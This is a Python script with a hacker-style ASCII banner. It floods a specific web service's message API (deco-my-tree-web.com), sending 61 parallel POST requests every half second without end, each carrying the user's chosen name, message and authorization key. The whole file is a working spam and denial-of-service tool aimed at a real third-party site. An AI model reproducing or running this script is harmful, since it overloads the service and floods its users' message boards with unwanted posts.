import concurrent.futures
import requests
import time

def send_request(url, payload, headers):
    try:
        response = requests.post(url, json=payload, headers=headers)
        response.raise_for_status()  # Raise an HTTPError for bad responses
        return response.json()
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"

def send_parallel_requests(url, payload, headers, num_requests):
    while True:
        with concurrent.futures.ProcessPoolExecutor(max_workers=num_requests) as executor:
            # Launch the requests asynchronously
            futures = [executor.submit(send_request, url, payload, headers) for _ in range(num_requests)]

            # Wait for all requests to complete
            results = [future.result() for future in concurrent.futures.as_completed(futures)]

        # Print the results
        for result in results:
            if isinstance(result, dict):
                print("POST request successful!")
                print("Response content:", result)
            else:
                print(result)

        # Pause for a short time before making the next set of parallel requests
        time.sleep(0.5)

if __name__ == "__main__":
    print("""
        .S_sSSs      sSSs    sSSs    sSSs_sSSs     .S_sSSs     .S       S.   sdSS_SSSSSSbs  
        .SS~YS%%b    d%%SP   d%%SP   d%%SP~YS%%b   .SS~YS%%b   .SS       SS.  YSSS~S%SSSSSP  
        S%S   `S%b  d%S'    d%S'    d%S'     `S%b  S%S   `S%b  S%S       S%S       S%S       
        S%S    S%S  S%S     S%S     S%S       S%S  S%S    S%S  S%S       S%S       S%S       
        S%S    S&S  S&S     S&S     S&S       S&S  S%S    S&S  S&S       S&S       S&S       
        S&S    S&S  S&S_Ss  S&S     S&S       S&S  S&S    S&S  S&S       S&S       S&S       
        S&S    S&S  S&S~SP  S&S     S&S       S&S  S&S    S&S  S&S       S&S       S&S       
        S&S    S&S  S&S     S&S     S&S       S&S  S&S    S&S  S&S       S&S       S&S       
        S*S    d*S  S*b     S*b     S*b       d*S  S*S    S*S  S*b       d*S       S*S       
        S*S   .S*S  S*S.    S*S.    S*S.     .S*S  S*S    S*S  S*S.     .S*S       S*S       
        S*S_sdSSS    SSSbs   SSSbs   SSSbs_sdSSS   S*S    S*S   SSSbs_sdSSS        S*S       
        SSS~YSSY      YSSP    YSSP    YSSP~YSSY    S*S    SSS    YSSP~YSSY         S*S       
                                                   SP                              SP        
                                                   Y                               Y         
                                                                                             
                                                                                            """)

    code = input("URL Code:")
    url = f"https://deco-my-tree-web.com/api/v1/message/{code}"
    name = input("Name:")
    msg = input("Message:")
    auth = input("Authorization Key:")

    payload = {
        "name": name,
        "content": msg,
        "deco_index": 0,
        "only_for_user": False
    }

    headers = {
        "Content-Type": "application/json",
        "Authorization": auth,
    }

    num_requests = 61

    # Start making parallel requests continuously
    send_parallel_requests(url, payload, headers, num_requests)
